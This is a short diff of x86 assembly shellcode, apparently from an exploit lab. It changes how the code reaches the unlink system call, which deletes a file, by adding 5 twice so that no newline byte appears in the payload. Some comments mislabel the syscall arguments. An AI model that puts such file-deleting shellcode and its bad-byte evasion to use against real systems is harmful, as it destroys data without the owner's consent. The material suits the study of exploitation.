@@ -18,18 +18,14 @@
 	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
 	movl	%eax,(ENVP)(%esi)	/* set up null envp */
 
-	movb	$SYS_unlink,%al		/* unlink to rm a file */
-	movl	%esi,%ebx			/* syscall arg 2: string pathname */
 
-	push $0x08
-	pop %eax
-	push $0x02 
-	pop %ecx
-	orl %ecx, %eax
-	int	$0x80					/* invoke call */
+    add     $5, %al         	/* add 5 low bytes to avoid the unlink syscall, is 10 or '\n' (newline) */
+    add     $5, %al         	/* add 5 low bytes to avoid the unlink syscall, is 10 or '\n' (newline) */
+    movl    %esi,%ebx       	/* syscall arg 2: string pathname */
+    leal    ARGV(%esi),%ecx     /* syscall arg 2: argv */
+    leal    ENVP(%esi),%edx     /* syscall arg 3: envp */
+    int $0x80           /* invoke syscall */
 
-	movl $x10, %eax
-	int	$0x80
 
 	xorl	%ebx,%ebx			/* syscall arg 2: 0 */
 	movl	%ebx,%eax
